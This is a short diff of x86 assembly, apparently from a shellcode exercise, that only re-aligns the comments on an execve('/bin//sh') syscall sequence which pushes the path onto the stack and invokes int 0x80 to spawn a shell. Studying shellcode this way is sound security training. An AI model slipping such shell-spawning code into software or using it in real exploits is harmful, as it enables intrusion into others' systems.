@@ -81,15 +81,15 @@ for:
 	; execve("/bin//sh", null, null)
 	; write them in reverse order
 	
-        mov al, 0xb         ; execve()  
-	push edx            ; nulls for string termination
-   	push 0x68732f2f     ; "hs//"  
-        push 0x6e69622f     ; "nib/"  
-        mov ebx, esp        ; put addres of /bin//sh into ebx  
-	push edx 	    ; push 32 bit null terminator
-        mov edx, esp        ; empty area for envp
-	push ebx            ; push string addr to stack above null terminator
-	mov ecx, esp	    ; argv array
-    	int 0x80  	    ; peform syscall
+        mov al, 0xb         	; execve()  
+	push edx            	; nulls for string termination
+   	push 0x68732f2f     	; "hs//"  
+        push 0x6e69622f     	; "nib/"  
+        mov ebx, esp        	; put addres of /bin//sh into ebx  
+	push edx 	   	; push 32 bit null terminator
+        mov edx, esp        	; empty area for envp
+	push ebx            	; push string addr to stack above null terminator
+	mov ecx, esp	    	; argv array
+    	int 0x80  	    	; peform syscall
 	
 	
